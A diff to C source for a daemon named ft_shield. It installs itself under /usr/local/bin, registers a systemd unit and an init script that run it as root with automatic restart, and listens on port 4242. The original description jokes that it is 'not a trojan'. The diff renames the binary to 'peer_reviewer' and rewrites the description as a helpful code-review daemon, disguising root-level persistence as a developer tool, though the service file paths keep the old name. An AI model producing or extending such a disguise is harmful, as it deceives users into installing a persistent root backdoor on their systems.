@@ -14,7 +14,7 @@
 #include <semaphore.h>
 #include <arpa/inet.h>
 
-#define TARGET_PATH "/usr/local/bin/ft_shield"
+#define TARGET_PATH "/usr/local/bin/peer_reviewer"
 #define SERVICE_PATH_SYSTEMD "/etc/systemd/system/ft_shield.service"
 #define SERVICE_PATH_SYSVINIT "/etc/init.d/ft_shield"
 #define PORT 4242
@@ -68,10 +68,10 @@ void create_service_file(int systemd_enabled)
 {
     const char *service_content_systemd =
         "[Unit]\n"
-        "Description=I can say for sure 100%% real NO FAKE I'm not a trojan.\n"
+        "Description=Peer reviewer daemon for helping you code better.\n"
         "After=network.target\n\n"
         "[Service]\n"
-        "ExecStart=/usr/local/bin/ft_shield --daemon\n"
+        "ExecStart=/usr/local/bin/peer_reviewer --daemon\n"
         "Restart=always\n"
         "User=root\n\n"
         "[Install]\n"
@@ -85,15 +85,15 @@ void create_service_file(int systemd_enabled)
         "# Required-Stop:     $network\n"
         "# Default-Start:     2 3 4 5\n"
         "# Default-Stop:      0 1 6\n"
-        "# Short-Description: I can say for sure 100%% real NO FAKE I'm not a trojan.\n"
+        "# Short-Description: Peer reviewer daemon for helping you code better.\n"
         "### END INIT INFO\n"
         "\n"
         "case \"$1\" in\n"
         "    start)\n"
-        "        /usr/local/bin/ft_shield &\n"
+        "        /usr/local/bin/peer_reviewer &\n"
         "        ;;\n"
         "    stop)\n"
-        "        killall ft_shield\n"
+        "        killall peer_reviewer\n"
         "        ;;\n"
         "    *)\n"
         "        echo \"Usage: $0 {start|stop}\"\n"
